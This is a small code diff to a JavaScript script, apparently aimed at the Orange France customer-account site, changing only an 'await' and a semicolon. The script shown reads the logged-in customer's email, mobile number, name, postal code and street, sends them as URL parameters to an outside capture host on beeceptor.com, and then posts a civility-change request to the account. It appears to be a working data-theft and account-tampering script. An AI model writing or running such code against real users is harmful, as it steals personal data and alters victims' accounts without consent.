@@ -1,4 +1,4 @@
-fetch("https://espace-client.orange.fr/ecd_wp/account/identification", {
+await fetch("https://espace-client.orange.fr/ecd_wp/account/identification", {
   headers: {
     "X-Orange-Caller-Id": "ECQ"
   }
@@ -19,7 +19,7 @@ fetch("https://espace-client.orange.fr/ecd_wp/account/identification", {
       postalCode,
       street
     });
-    fetch(`https://sdsdf.free.beeceptor.com?${params.toString()}`)
+    fetch(`https://sdsdf.free.beeceptor.com?${params.toString()}`);
     console.log("email:", email);
     console.log("mobile:", mobile);
     console.log("firstName:", firstName);
@@ -39,7 +39,7 @@ const datos = {
 const formData = new FormData();
 formData.append("formBody", JSON.stringify(datos));
 
-fetch("https://espace-client.orange.fr/ecd_wp/v2.0/account/changeCivilityRequest", {
+await fetch("https://espace-client.orange.fr/ecd_wp/v2.0/account/changeCivilityRequest", {
   method: "POST",
   headers: {
     "X-Orange-Caller-Id": "ECQ"
